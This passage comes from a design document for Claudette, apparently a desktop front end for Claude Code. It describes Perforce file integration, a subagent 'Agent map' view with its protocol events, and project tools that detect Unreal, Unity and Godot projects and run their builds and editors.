- **It never waits for Perforce.** Polling each file's state freezes many editors' trees, so the explorer draws from a cache (`PerforceStatusCache`) and never asks `p4` on the UI thread. A folder's files are asked in one `p4 -ztag fstat -T <fields> folder/*`, off the UI thread, when the folder is read (shown, expanded, or read again after the disk changed), after Claudette's own `p4` commands, and on **Refresh**; never on a timer. A folder has one ask at a time, and one wanted meanwhile follows it. An answer a later ask overtook is dropped. The marks fill in when the answer comes.
- A server that doesn't answer leaves the tree without marks, with one quiet line under the explorer's header (*Perforce isn't answering, so the explorer has no Perforce marks. Refresh tries again.*), rather than an error for each folder. Every `p4` is bounded on the injected clock.

**The Perforce menu.** In a workspace, a file's and a folder's menu in the explorer, and a file tab's menu, have a Perforce section after the rest, with only what applies to the file as the cache knows it, or all of it while that isn't known, for Perforce to answer:

- **Check out** (`p4 edit`), for a depot file that isn't open.
- **Mark for add** (`p4 add`), for a file Perforce doesn't have; on a folder, `p4 reconcile -a folder/...`, which opens its new files, since `p4 add` takes no `...`.
- **Mark for delete** (`p4 delete`), which deletes the local file as Perforce does, so it asks first, in place under the explorer's header as **Delete** asks: *Mark Brain.cpp for delete? Perforce deletes it from the disk; Revert brings it back.* Its open files close.
- **Revert** (`p4 revert`): straight away when it would lose nothing, else it asks first (*Revert Brain.cpp? Its changes are lost.*); `p4 diff -sa` says which, and when Perforce can't say, it asks. Open files of it read the depot's copy back; unsaved edits of them go, as the question says.
- **Diff against the depot**: the revision synced here (`p4 print -q -o <file> file#have`) against the file, in the diff window, or in the diff tool when Settings → Files and diffs has one.
- A folder's commands name everything under it, `folder/...`. Paths escape Perforce's wildcard characters (`@ # % *`).
- What Perforce refuses (a file locked by someone else, an expired login) shows under the explorer's header, in the error color, until it's dismissed or the next command: *Couldn't check out Player.cpp: //depot/Player.cpp - locked by anna@anna-ws*. Answers that only mean there was nothing to do (*currently opened for edit*, *can't add existing file*) aren't errors.

### Opening files in Perforce

Settings → Perforce → **Opening files in Perforce**: five switches, each on by default, which apply only inside a workspace found as above.

- **Check out files before they're changed.**
  - *In a Files tab*: a depot file Perforce hasn't checked out opens editable, rather than read-only as a file read-only on disk otherwise does, and its first edit checks it out in the background. A save that comes first waits for the check-out, up to 30 seconds, then writes anyway, so a failure says why rather than losing the edit. With the switch off, it stays read-only, saying *Player.cpp isn't checked out in Perforce, so it's shown read-only. Check it out from its tab's menu to edit it.*
  - *For Claude*: every tab registers a second PreToolUse hook on Claude's file tools (`Edit|Write|MultiEdit|NotebookEdit`), after Changed files' own ([§8](#8-file-changes--diff-view)), with a 60-second timeout. Before the tool writes a depot file that isn't open (`tool_input.file_path`, or a notebook's `notebook_path`), it's checked out. The hook always answers `{"continue": true}` and never changes the call; it waits for the workspace and for `p4` only until 15 seconds before its timeout, since a hook that times out stops the tool, and a note in the conversation says when it couldn't check a file out or Perforce didn't answer in time.
  - *For Claudette's own writes*, such as replacing text in files: `PerforceFilesService.CheckOutBeforeWritingAsync`, one `p4 edit` for the depot files among them that aren't open, which a feature calls before writing.
- **Add new files.** A file made with a Files tab's **New file**, or that Claude's Write (or an Edit with nothing to replace) created, as Changed files learns from the tool's result, is marked for add. Perforce's own ignore rules (P4IGNORE) apply.
- **Mark deleted files for delete.** A file or folder deleted from the explorer still goes to the OS's trash, then gets `p4 delete -k`, which marks it for delete and leaves the local files (already gone) alone. One opened for add gets `p4 revert -k` instead, and one opened for edit `p4 revert -k` first. A link's target isn't what went, so a link isn't. Files Claude deletes with a command aren't seen.
- **Rename with p4 move.** A rename in the explorer, on disk as before, then `p4 edit` for what isn't open, and `p4 move -k old new`, which moves it on the server and leaves the local files alone. A folder moves `old/...` to `new/...`. A file Perforce doesn't have is left as it is; if `p4` fails, the rename on disk stays and the error shows.
- **Show Perforce state in the Files tab**: the marks above.

**Which changelist.** The one the tab is working in, the pending changelist its `CL` badge shows ([above](#perforce-changelist-in-the-tab-title)), else the default changelist. A Files tab uses the one of its project's session tab focused most recently. Commands pass it with `-c`.

**An expired login.** With ticket handling on for one of the project's tabs, an expired ticket is renewed through its keeper and the command tried once more; otherwise the command's error says so.

**How it's built.** Core's `Perforce/`: `PerforceFileState` (reading `p4 fstat`), `PerforceFileCommands` (the commands' arguments, escaping, and which answers are errors), `PerforceStatusCache` and `PerforceWorkspaceFinder`. The App's `Services/PerforceFilesService` (`services.Perforce.Files`) runs them off the UI thread; `ProjectFilesViewModel.Perforce.cs` is the Files tab's side, and `PerforceViewModel` the hook and Claude's new files. Tests use `FakeP4`, which keeps a small depot: `PerforceFilesTests` in Core, `PerforceFilesTabTests` in the App. The App tests' harness never runs the real `p4` (`NoRealP4Launcher`), since a Files tab looks for its workspace by itself.

> **Not yet tried for real:** a real Perforce server, streams and exclusive-open (`+l`) file types, and P4IGNORE.

### Agent map

✅ Built 2026-09-29.

A live view of what a tab's subagents are doing. When Claude fans work out to several subagents, possibly nested, the conversation shows each one as a collapsed group ([§5](#5-conversation-view)). That's fine for one agent at a time, but hard to follow when several run in parallel.

- **What it shows.** A tree list of the tab's agents: the main agent at the root, and each subagent as a node under the agent that started it, with nesting kept. Nodes start expanded and can be collapsed. An agent that finishes with nothing under it still going folds its subtree away, so a long session's tree stays short; a prompt from inside it opens it again. Only the rows in view are built.
- **Each row** has two compact lines, following the VS Code extension's compact rows ([§3](#visual-style)):
  - A status mark, the task description, and the running time at the right.
  - The agent type (for example `Explore` or `general-purpose`), then what it's doing right now: its latest tool call, summarized the way the conversation's tool rows are (for example `Grep auth in src/`), or the first line of its latest text. Once it has finished: the first line of its report, or how it ended.
  - **Summarize subagents' progress** (Settings → Claude Code, off by default) asks Claude Code for a line about how far each subagent has got (`agentProgressSummaries` on `initialize`; the line comes on `task_progress` as `summary`), shown in place of its latest tool call while it runs. Each summary is a small extra model call that counts toward usage, hence off by default. It applies to tabs started after the change.
  - Statuses: running (a pulsing dot), waiting on a permission prompt (`!`, and the row is highlighted like the prompt card), done (a green dot), failed (`✕`), stopped (`■`). A background subagent reads "Running in the background".
  - A subagent that can be stopped has a **■** at the row's right, after its running time, shown while the row is under the pointer or selected (or the button has keyboard focus), as a tab's close button is. Its place is kept the rest of the time, so the time doesn't move. It's **Stop subagent…** (below), which the running-tasks chip's list used to offer too ([§5](#running-tasks)).
- **Details.** Selecting a node shows, below the tree:
  - Its status, and its type, model, running time, tool calls and tokens.
  - **The prompt it was given**: the `prompt` input of its `Agent` call, rendered as Markdown, with **Copy**.
  - **What it returned**: the report its parent received, as Markdown with **Copy**, once it has finished.
  - **Show in conversation** (**Go to the prompt** while it waits; **Show its work** with their work under the tab, [§5](#subagents)) and **Stop subagent…**. The same actions, and **Copy prompt** / **Copy result**, are on the row's right-click menu.
  - The prompt and result are one click away rather than always expanded, as in the VS Code extension.
- **Where it lives.**
  - The **Agents** tool window, between Changed files and Processes. The page button shows a busy dot while a subagent runs, and the page's header sums the tree up, for example *"2 agents running (1 waiting on you); 2 done"*.
  - **A window of its own**, from the button at the top of the page: the tree beside the details, for wide fan-outs. One per tab; it closes with the tab.
  - An **Agents** button in the composer bar while the tab has subagents (*"2 agents running"*, or *"Agents (3)"* once they've finished) shows the Agents tool window.
  - An **Agents** row in the tab info card ([§4](#4-tabs--sessions)): for example *"3 agents running"*, *"3 agents running (1 waiting on you)"* or *"4 agents: 3 done, 1 stopped"*. No row while a tab has no subagents.
  - The main agent's row shows whether a turn is running, and its latest tool call.
- **Interaction.**
  - Clicking a node (or Enter) shows the subagent's work in the tab, with a prompt it waits on under it ([§5](#subagents)). With Settings → Conversation → **Show subagents' work** on **In the conversation**, it scrolls the conversation to that subagent's group and expands it instead, along with any groups it's nested in.
  - A node waiting on a permission prompt is highlighted, and clicking it goes to the prompt instead. The prompt card itself names the subagent asking, for example *"Asked by the Explore subagent: Find the auth code"* ([§7](#7-permission-prompts)).
  - **Stop subagent…** stops that subagent, and any subagents it started, after a confirmation. It goes through `stop_task` with the subagent's task id, so Claude is told it was stopped and the rest of the turn carries on. A subagent Claude Code hasn't given a task id offers **Stop turn…** instead, the whole-turn Stop.
- **Running time** comes from the app's clock and ticks every second while an agent runs. When a subagent finishes, the duration Claude Code reports replaces it.
- **Tokens** are the numbers Claude Code reports: from `task_progress` while it runs, then from its result or task notification. They're the subagent's latest request (roughly its context), not a running total, and the details' tooltip says so.
- **Restored tabs.** A transcript replay shows the finished tree, with no live status, running clock or Stop.
  - Claude Code keeps each subagent's own transcript in `<session-id>/subagents/agent-<id>.jsonl`, with a `.meta.json` naming the `Agent` call that started it (`toolUseId`). Claudette merges them into the replay in time order, so restored subagent groups get their tool calls back and nested subagents their place in the tree. The session library already copies that folder ([§9](#session-library-sync-across-machines)).
  - A background subagent's result is read from the `<task-notification>` Claude Code recorded for the model: a user turn when the model was idle, or a queued command's attachment when it ended mid-turn. Neither is shown as something the user typed, in the tab or in History.
  - A subagent with no recorded result reads *"Didn't finish"*.
- **Decisions.**
  - **A tree list, not a graph layout.** Compact indented rows fit a tool window and read like the rest of the app. The window gives wide fan-outs more room.
  - **Agent teams (teammates) aren't covered.** Claude Code only spawns teammates in interactive sessions: in `-p` mode, as Claudette runs it, "a subagent that Claude names runs as an ordinary subagent even with agent teams enabled" (the agent teams docs), and it shows in the map like any other. Revisit if Claudette ever runs sessions that can have teammates.
- **How it works.** Confirmed against Claude Code 2.1.284 with the mock Messages API, and recorded as the `12-subagents` protocol fixture:
  - Subagent traffic carries `parent_tool_use_id`, the `Agent` call that started it, at every depth, plus `subagent_type` and `task_description`. With `--forward-subagent-text` that includes their text; the subagent's prompt also arrives as a `user` message inside it. Partial `stream_event`s are for the main agent only.
  - `task_started` (`task_type: "local_agent"`) follows each `Agent` call, with `task_id`, `tool_use_id`, `subagent_type`, `is_backgrounded`, `spawn_depth` and the `prompt`. Then come `task_progress` while it works (`usage.total_tokens`, `usage.tool_uses`, `last_tool_name`, and a one-line `description`), and `task_updated` and `task_notification` (`completed`, `failed` or `stopped`, with `summary` and `usage`) when it ends. This is true of foreground subagents too, not only background ones.
  - A permission request from inside a subagent carries `agent_id`, the subagent's task id, and arrives just before the tool call it's for.
  - A top-level foreground subagent's result has `tool_use_result` with `status: "completed"`, `content` (its report), `totalTokens`, `totalToolUseCount`, `totalDurationMs`, `agentType` and `resolvedModel`. Its tool result text wraps the report in a "[Subagent hand-back]" frame with an `agentId` and `<usage>` trailer. A nested subagent's result has only that text, so Claudette reads the report out of the frame, and falls back to the subagent's last text.
  - In `-p` mode, a subagent Claude doesn't explicitly run in the foreground runs in the background: its `Agent` call returns at once with `status: "async_launched"`, and it ends with a `task_notification`, which starts a new turn. Its group in the conversation stays running until then.
  - `stop_task` with a subagent's task id stops it, in the foreground or the background, along with the subagents it started: `task_updated` (`killed`), `task_notification` (`stopped`), and its `Agent` call returns an error marked `tool_result_meta: [{ non_execution_kind: "interrupted" }]`. The turn carries on. The Agent SDK documents `stopTask` for background tasks only, so this is marked undocumented in `compat/surface.yaml`, with the whole-turn Stop as the fallback. An interrupt stops running subagents the same way.
  - `tool_progress` for a foreground subagent: a heartbeat every 30 seconds (`heartbeat: true`), and `subagent_retry` while it waits out an API error, which its row shows as *"Retrying after a rate limit (attempt 2 of 10)…"*.
  - `CLAUDE_CODE_MAX_SUBAGENT_SPAWN_DEPTH`, user configuration that passes through to `claude` ([§13](#integration-with-claude-code)), limits nesting (three layers by default), so on some machines the tree is shallower.
- **Tests.** `AgentMapTests` (the view model, including the recorded fixture replayed through a tab), `ReplayTests`, `TranscriptReaderTests`, `FakeClaudeTests` (`fake-claude`'s `SUBAGENTS` prompt, and stopping a subagent while it waits on a prompt) and `RealCliTests` (the mock's `SUBAGENTS` and `LONG_AGENT` scripts against the real CLI).

### Project tools

✅ Built 2026-09-29.

A tab can do things for the project in its folder: launch the editor, generate project files, build, open the solution. Which things depends on the project. Claudette knows Unreal Engine, Unity and Godot projects; a folder can also have its own actions and links, in a `claudette.json` beside the project.

**Where the actions are.**

- **The project's icon** on its group's row in the sidebar, before **Project files** ([§4](#sidebar)): its project type's icon (Unreal Engine's logo, a cube for Unity, Godot's logo for Godot; a folder without a project), with the project's name, version and kind in its tooltip, for example *"NightOwl · UE 5.4 (Unreal Engine)"*, and the main action's shortcut. It's there for every group with a session tab, whatever its folder holds, so the first action or link can be added from it. When no provider recognized a project, its tooltip has the folder's path. It's for the group's tab used last, whose jobs it runs and shows: while one runs, a busy dot replaces the icon and the job's name leads the tooltip (*"Build editor… · NightOwl · UE 5.4 (Unreal Engine)"*). In the rail it's under the group's color, before its Project Files tab. A click opens its menu beside the sidebar. (It was a chip in the composer bar at first, then a row at the sidebar's foot for the selected tab; it moved to each group to leave the foot to the update badges, and so each project's tools sit with its tabs. `TabGroupViewModel.ProjectTab` is the tab it's for.) Its menu has:
  - a header: the project's name and kind, the engine's version and kind, and the engine's folder, or what's wrong ("The engine for EngineAssociation "5.9" wasn't found on this machine"); without a project, the folder's name and path;
  - entries of `claudette.json` that were skipped, and why;
  - **Projects in this folder**, when there are several, as radio items; the pick is remembered per tab folder on this machine;
  - the project's actions;
  - the project's choice, such as Unreal's **Editor configuration** (Development or DebugGame), as radio items;
  - **Choose engine folder…** (or **Choose another engine folder…**);
  - the folder's custom actions, then its **Links**;
  - **Show in Explorer** (**Show in Finder** on macOS, **Show in file manager** on Linux), which opens the project's folder in the OS's file manager (the tab's folder when no project was recognized; its path is the tip), **Show output…**, which shows the newest run's log in the main area (only with project tools: a project, custom actions or skipped entries; disabled until an action has run, *"No action has run in this tab yet"*), **Add an action…**, **Add a link…** and **Refresh**.
  - Disabled items say why in their tooltip ("Generate project files first."). The menu looks at the project's files again each time it opens, so it's current.
  - (The tab's menu had the same entries in a submenu until the row showed for every tab, which made it redundant.)
- **The Project tool window** ([Tool windows](#tool-windows)), beside Changed files, Agents and Processes. Its button shows a busy dot while a job runs. It shows:
  - the project's details: its file, the engine's version, folder and kind, the editor target and the configuration;
  - with runs, a line saying their logs are under the tab in the sidebar.
  - (It had a button per action at first, then the selected run's log until 2026-10-17. The project's menu has the actions, and each run's log shows in the main area: **A run's log**, below.)
- **Runs.** Each job is a run: a build, generating project files, a custom action with output, Clean's deletion, or one that couldn't start, whose log says why. Launch and Open actions start a program that runs on its own, with no output, so they don't make one.
  - **In the sidebar**, each run is an entry under its tab's row, newest last ([§4](#sidebar)): its state, its name, and how long it has run or how it ended. Clicking one shows its log in the main area (**A run's log**, below).
  - **Entries stay** until the user closes them, whatever the result: × on a finished one takes it and its log away. A running one has **Stop** in the × button's place, so a stray click never ends a build.
  - Closing the tab takes its runs away. They aren't saved: they're gone when Claudette quits or restarts.
- **A run's log.** ✅ Built 2026-10-17. It shows in the main area, where the conversation is, as a tab of the panes without a composer, so a build's errors get the room a conversation has rather than a tool window's.
  - **Showing it.** Clicking its entry shows it in the focused pane, in the conversation's place, as picking a tab in the sidebar does; the tab's own row goes back to the conversation. **Show output…** in the project's menu shows the newest run's log, and the notification the log of the run it's about. A run that starts doesn't take the main area: its entry appears, with the busy dot, and the conversation stays.
  - **Panes.** It takes part in split panes as a Files tab does ([Split panes](#split-panes)): **Open beside** in its entry's menu, dragging its entry onto a pane, a pane header with **Close pane**, and a click in it focusing it. So a build can run beside the conversation. Runs aren't saved, so the app state keeps the run's tab in its place, and its tab is the one selected after a restart.
  - **What it shows.** A header with the run's state, its name, its status line (*"Build editor failed (exit code 6)."*, in the error color for a failure), when it started and how long it took (*Started 14:30 · took 1m 05s*, or *· 1m 05s so far* while it runs) and how many lines were dropped, with **Stay current**, **Wrap lines**, **Stop** while it runs, **Copy** (the whole log) and **Close** once it's done. Under it, the log: monospace, wrapping at the width shown, and following the newest line as a terminal does. Its text can be selected and copied, and `Ctrl/Cmd+F` finds in it. Each run keeps at most its last 5,000 lines, dropping the oldest 500 at a time.
  - **Stay current.** ✅ Built 2026-10-21. A switch over the log, on to begin with: on, the log keeps its newest line in view as lines come. Scrolling up from the end turns it off, and the log holds still where it was while lines come; scrolling back to the end, or turning it on, goes to the newest line and follows again. Its tip: *"Keep the newest line in view: scrolling up turns it off, and scrolling back to the end turns it on"*. When what's shown changes under it, as when an editor's log is filtered or a log is wrapped or not, a log that isn't staying current comes back to the line that was at its top, or the next one shown.
  - **Wrap lines.** ✅ Built 2026-10-21. A switch beside it, on to begin with: on, long lines wrap at the width shown; off, they don't, and the log scrolls sideways. Each new log, a run's or an editor's, starts as the last one was left (the app state's `LogWordWrap`).
  - **Links.** Web addresses (`http`, `https`) open in the browser. A path opens as a file named in a reply does ([Files named in Claude's replies](#files-named-in-claudes-replies)): in Claudette's editor at the line named, beside the log as from a conversation, or in the OS's app, as Settings → Files and diffs says; a folder in the explorer or the file manager; and a program, script or shortcut shows in its folder rather than running. Links are in the accent, underlined, with the hand pointer, and a click opens one rather than starting a selection.
    - **Which paths.** With a line number, as build tools write them: MSVC's, Unreal's and Unity's `Player.cpp(42)` and `Assets/Player.cs(12,5)`, gcc's, clang's and most others' `src/main.rs:42:7`, Python's `File "tool.py", line 42` and .NET's `in C:\Work\Pack.cs:line 42`. In quotes, which may have spaces. On their own with a folder in them: `Saved/Logs/Game.log`, `C:\Work\Game\Binaries`, `~/builds`. A name alone (`Player.cpp`) is a path only with a line number. A path with a drive may have spaces and parentheses before its line number (`C:\Program Files (x86)\…\xstring(123)`); otherwise a path ends at a space.
    - **Only once it's found.** A path is read against the folder the job ran in, then the tab's, and becomes a link only once something is there, so `3/120` and `Win64/Development` stay text. It's looked for as its line shows, off the UI thread, within a reply's limits: before a click, only the tab's folders, the user's home and the computer's own drives, and never a network path. What was found is remembered for the run, up to 2,048 paths. A click looks again, and a file gone since adds a note to the tab's conversation: *"Couldn't find Saved/Logs/Game.log."*
    - Only the first 4,000 characters of a line are looked through.
  - **Keyboard.** `Ctrl/Cmd+W` closes a finished run's log, as its × does; on a running one it goes back to the tab instead, so the key never stops a build. `Ctrl+Tab` and `Ctrl/Cmd+1…9` go through session tabs only, as from a Files tab; from a log, the next tab is the one after its tab, and the one before is its tab.
  - **How it's built.** `ProjectRunViewModel` is a `LogTabViewModel`, an `IShellTab`, as an editor's log is ([Editor logs](#project-tools), below): it joins the shell's `OpenTabs` when it starts and leaves them when it's closed or its tab is (`ShellViewModel.ProjectRuns.cs`). `LogTabViewModel.Links.cs` finds and opens its links, with a `ReplyFileFinder` that never looks for names. Core's `ProjectTools/RunLogLinks` finds the links in a line. `Views/ProjectRunView` is the log, a read-only AvaloniaEdit editor that `Views/LogMirror` keeps in step with the run's lines (an Add for each batch, a Remove when the oldest go), and `Views/RunLogLinkGenerator` draws the links. A log's lines are Core's `LogLine`s, a run's with nothing but their text. **Stay current** and **Wrap lines** are `LogTabViewModel.StayCurrent` and `WordWrap`; `LogMirror` sets the one from where the log is scrolled to and remembers the line at its top (`TopLine`), and the `nowrap` class on the editor is the other. AvaloniaEdit's own `ScrollToVerticalOffset` doesn't move it, so following the newest line sets its scroll viewer's offset. Tested by `RunLogLinksTests` (Core), `ProjectRunsTests` and `ProjectToolsUiTests`, which clicks a rendered link.
- **The keyboard.** **Run the project's main action**, `Ctrl/Cmd+Shift+E` by default and rebindable ([§14](#keyboard-shortcuts)): Launch editor for Unreal, Open in Unity, Open in Godot, else the folder's first custom action.

**How it's built.** `Claudette.Core/ProjectTools`:

- A project type, an `IProjectType` ([Project types](#project-types), below), finds its kind of project for a folder and describes it as a `ProjectInfo`: kind, name, root, details, actions, a per-project choice, a fix (**Choose engine folder…**) and the note for Claude.
- A `ProjectAction` has an id, a label, a description and one of four kinds:
  - **Launch**: a program that outlives Claudette, such as the editor. It starts detached, and nothing of it is tracked.
  - **Run**: a long job. It gets an entry in the sidebar with its own log, shown in the main area; **Stop** ends it, and its end is notified. One job runs at a time per tab; the other jobs are disabled until it ends.
  - **Open**: a file or folder, opened with the OS's app, or for a solution with the IDE chosen in Settings.
  - **Destructive**: confirmed first, such as deleting folders.
- Every command is built by a pure function that takes the OS, so all three OSes' commands are tested on any machine.
- **Detection** runs off the UI thread when a tab opens and before its session starts, when its folder changes, when the project's menu opens, and on **Refresh**. It's cheap: a bounded walk and a few small files.
  - The tab's folder, its subfolders two levels down (for `Game/NightOwl/NightOwl.uproject`), and its parent folders up to the repository's root: a folder with `.git` (a folder, or a worktree's file), `.p4config` or the file `P4CONFIG` names, or six levels up (for a tab opened on `Source/`).
  - It never looks into the folders every project has (`obj`, `bin`, `node_modules`, `.git`, `.vs`, `.vscode`, `.idea` and the like), any type's own build and cache folders, whether the type is on or not (Unreal's `Intermediate`, `Saved`, `DerivedDataCache`, `Binaries`, `Content`, `Plugins`, `Source`, `Config`, `Engine`, `Templates`, `FeaturePacks`; Unity's `Library`, `Temp`, `Logs`, `Packages`), hidden folders or links, and at most 2,000 folders.
  - Several projects are listed nearest first: the folder, then its subfolders, then its parents.
- **Jobs** start through `IProcessLauncher` with `TrackProcessTree`, so they show in the process monitor ([§4](#process-monitor)) and **Stop** ends everything they started (UnrealBuildTool starts children). Closing the tab stops a running job with the tab's other processes, unless they're kept.
- **Environment.** Jobs and launches get the user's environment: on macOS and Linux, with the login shell's merged in ([Login shell environment](#login-shell-environment)), so a build finds `dotnet`, the editor or a Homebrew tool on the same `PATH` as a terminal, and a bare program name is looked up on that `PATH`. Claude Code's session variables are removed ([§13](#integration-with-claude-code)), so a command that runs `claude` behaves as it would in a terminal. `ProjectToolEnvironment` is the one place this is built.
- **Remembered on this machine**, in `state.json`: the project a folder uses when it has several, each project's choices (Unreal's configuration and engine folder, keyed by its `.uproject`; Unity's code optimization and editor; Godot's executable). None of it syncs.
- **The note to Claude.** Each project type has its own note, added through `--append-system-prompt` unless its **Tell Claude about … projects** is off in Settings → Project tools, before Perforce's note when both apply.


#### Project types

✅ Built 2026-10-23. Each kind of project Claudette knows is a *project type*: Unreal Engine, Unity and Godot. A type is a class in `Claudette.Core/ProjectTools` that implements `IProjectType`, built into Claudette rather than loaded at run time, so a type is added with a pull request ([below](#adding-a-project-type)).

- **What it declares.** Its kind, a stable id such as `unreal` that is its projects' kind and its settings' key; its name; a line for Settings saying what it recognizes and does; what its note to Claude says; its own settings; and the folders its projects keep their builds and caches in, which the search for projects never looks into.
- **What it does.** `Find` lists its projects for a folder, nearest first, and `Describe` reads one into a `ProjectInfo` with its actions and its note to Claude. Both run off the UI thread, so they stay cheap: bounded walks, small files, nothing started. A type that throws is caught: its project shows with the problem and no actions.
- **Its settings.** Each is a `ProjectTypeChoice` (a dropdown: Unreal's default editor configuration and project files, Unity's code optimization) or a `ProjectTypePath` (a program or folder, with **Browse…**, and **Detect** when the type can find it: the Godot executable). The type's page in Settings → Project tools draws them under **Defaults** ([§14](#pages)), so a type's settings need no view of their own. Their values are kept in `settings.json` by type and key, such as `projectTools.types.unreal.values.configuration`, and only while they differ from the default.
- **On and off, on each machine.** Each type's section starts with **Recognize … projects**: off, the detector skips the type, so its projects are folders like any other (a `claudette.json`'s actions and links still work), and Claude isn't told about them. **Tell Claude about … projects** leaves the note out while still recognizing the project. Both are on by default, and neither syncs.
- **Older settings.** A `settings.json` from before project types had Unreal's, Unity's and Godot's settings as fields of their own (`unrealConfiguration`, `projectFileFormat`, `tellClaudeAboutUnreal`, `unityCodeOptimization`, `tellClaudeAboutUnity`, `godotPath`, `tellClaudeAboutGodot`). Reading one moves each value the user had changed to its type, and the old fields are never written back.

##### Adding a project type

- A class implementing `IProjectType`, in a folder of its own under `Claudette.Core/ProjectTools` as `Unreal/`, `Unity/` and `Godot/` are, added to the list in `ProjectToolsService.AllTypes`. Settings → Project tools gives it a page, with its switches and its settings, without more work.
- Its icon, a small vector icon in `App.axaml` named in `ProjectTypeIcons`, for its page and the project's icon on its group's row: drawn for what the kind is known by, unless its maker lets Claudette show its logo, which is the maker's trademark ([About](#about)). Godot's is its logo: the monochrome icon from Godot's press kit as one shape, filled in the color the others are stroked in; Settings → Godot's title is its whole logo, the press kit's small horizontal one, in color. Unreal Engine's is Epic's icon, in Epic's black or white ([About](#about)). Unity's guidelines need its written permission, so Unity has a cube. Without one it has a wrench.
- Its commands built by pure functions that take the OS, as the others' are, so every OS's are tested on any machine, and its tests beside theirs in `tests/Claudette.Core.Tests/ProjectTools`, with pretend projects in a temporary folder and no real tools.
- Its section in this document, under Project tools, and its page in the user guide (GUIDE.md).

**Unreal Engine.**

- **Finding the project.** `*.uproject` files, found as above.
- **The `.uproject`** is JSON, read tolerantly: comments, trailing commas and unknown fields are fine, and a file that isn't JSON still counts as a project.
  - `EngineAssociation` says which engine it uses.
  - The editor target comes from `Source/*Editor.Target.cs`: `<Name>Editor` when there's one, else the first; `<Name>Editor` when there are none.
  - A project with no `Source` targets and no `Modules` has no C++ code: it has no project files to generate, and nothing to build with an installed engine.
  - Enabled `Plugins` are listed on the Project page.
- **Finding the engine** (`UnrealEngineLocator`). An engine only counts when it has `Engine/Build/Build.version`.
  - A folder chosen for the project with **Choose engine folder…** comes first. The pick is checked for `Build.version` (the `Engine` folder itself is accepted too) and remembered per project.
  - **Empty or missing association:** the engine is in a parent folder, the "native" layout. Claudette walks up from the project looking for `Engine/Build/Build.version`.
  - **A version such as `5.4`:** a launcher install. On Windows, `%ProgramData%\Epic\UnrealEngineLauncher\LauncherInstalled.dat` (JSON: an `InstallationList` of `AppName` `UE_5.4` and `InstallLocation`), then the registry, `HKLM\SOFTWARE\EpicGames\Unreal Engine\5.4`, value `InstalledDirectory`, in the 64-bit and then the 32-bit view. On macOS, `~/Library/Application Support/Epic/UnrealEngineLauncher/LauncherInstalled.dat`. Linux has no launcher.
  - **Anything else, usually a GUID:** a build registered by UnrealVersionSelector. On Windows, `HKCU\SOFTWARE\Epic Games\Unreal Engine\Builds`, where each value's name is a build's id and its data the engine's folder. On Linux, `~/.config/Epic/UnrealEngine/Install.ini`, and on macOS `~/Library/Application Support/Epic/UnrealEngine/Install.ini`: the `[Installations]` section's `{GUID}=path` lines. GUIDs are compared with and without braces, ignoring case.
  - The registry is read in `Claudette.Platform` (`WindowsUnrealEngineRegistry`), behind `IUnrealEngineRegistry`.
  - **The version** is `Build.version`'s `MajorVersion`, `MinorVersion` and `PatchVersion` (and `BranchName`), shown as "Unreal Engine 5.4.2". The project's icon's tooltip shows `UE 5.4`, from the association when the engine isn't found.
  - **Its kind:** "launcher install", "source build", "installed build" (one with `Engine/Build/InstalledBuild.txt` that isn't the launcher's), "engine in a parent folder", or "chosen by you".
  - **Unreal Engine 4** calls its editor `UE4Editor`; the build scripts are the same.
  - **Not found:** the menu says so, the engine's actions are disabled ("The engine wasn't found: choose its folder in this menu."), and **Choose engine folder…** is offered.
- **Actions.**
  - **Launch editor** (the main action), detached: `Engine/Binaries/Win64/UnrealEditor.exe "<uproject>"`, `Engine/Binaries/Mac/UnrealEditor.app/Contents/MacOS/UnrealEditor "<uproject>"` or `Engine/Binaries/Linux/UnrealEditor "<uproject>"`. DebugGame adds `-debug`, which loads the DebugGame module DLLs, and the label says "Launch editor (DebugGame)". Disabled when the editor isn't built yet.
  - **Generate project files**, a job: `Engine/Build/BatchFiles/Build.bat -projectfiles -project="<uproject>" -game -progress`, or `Mac/Build.sh` or `Linux/Build.sh` under `BatchFiles`. This is what UnrealVersionSelector runs, and `Build.bat` is in launcher installs as well as source builds (`GenerateProjectFiles.bat` is only in source builds). VS Code adds `-vscode`. Visual Studio and Xcode are UnrealBuildTool's defaults on Windows and macOS, so they add nothing, which leaves the user's `BuildConfiguration.xml` in charge.
  - **Build editor**, a job: `Build.bat <EditorTarget> Win64 <Development|DebugGame> -Project="<uproject>" -WaitMutex`, with `Build.sh` and `Mac` or `Linux` elsewhere. A project without code builds `UnrealEditor` with a source build.
  - **Build and launch**: Build editor, then Launch editor if the build succeeded.
  - **Open solution**: `<Name>.sln` for Visual Studio, `<Name> (Mac).xcworkspace` or `<Name>.xcworkspace` for Xcode (a folder, which macOS opens as a document), `<Name>.code-workspace` for VS Code, in the project's folder. Disabled with "Generate project files first." when it's missing. It opens with the OS's app, or the IDE chosen in Settings:
    - Rider: `rider64.exe` on the `PATH`, the Toolbox's `rider.cmd`, or the newest `%ProgramFiles%\JetBrains\JetBrains Rider*\bin\rider64.exe` on Windows; `open -a Rider` on macOS; `rider` or the Toolbox's script on Linux. For Unreal, Rider opens the `.uproject` instead: see **Open in Rider**, below.
    - Visual Studio: the newest `%ProgramFiles%\Microsoft Visual Studio\*\*\Common7\IDE\devenv.exe` on Windows; `open -a "Visual Studio"` on macOS.
    - VS Code: `Code.exe` in `%LOCALAPPDATA%\Programs` or `%ProgramFiles%`, else `code.cmd` on the `PATH`, on Windows; `open -a "Visual Studio Code"` on macOS; `code` on Linux.
    - Another program, given the solution's path.
  - **Open in Rider**, in place of Open solution when Settings → Project tools → All tools → Open solutions with is Rider ([GitHub issue #6](https://github.com/dotBunny/Claudette/issues/6)): Rider is given the `.uproject`, on every OS. Rider has its own Unreal project model: it reads the `.uproject`, runs UnrealBuildTool's Rider generator itself (JSON files under `Intermediate/ProjectFiles/.Rider`) and builds through UnrealBuildTool, so there are no project files to generate first, and none to regenerate when source files or modules are added. It's always enabled, and **Generate project files**' tip says Rider doesn't need them. There's no separate entry for the `.sln`: the engine programs and mobile targets that Rider's `.uproject` model doesn't cover yet open from Rider's own **File → Open**.
    - Rider reads a `.uproject` from Unreal Engine 4.25.4 on Windows and 4.26 on macOS and Linux. With an older engine, the action stays **Open solution**, as above. An engine whose version isn't known is taken to be new enough.
    - When Rider can't be found or started, the `.uproject` isn't handed to the OS's app, which would start the Unreal editor instead: a note says Rider wasn't found and points at **Another program…** in Settings → Project tools → All tools. (On macOS, `open -a Rider` finds Rider wherever it is.)
    - When the IDE isn't found, the OS's app opens it and a note says so.
  - **Open latest log**: `Saved/Logs/<Name>.log`, disabled when there's none yet.
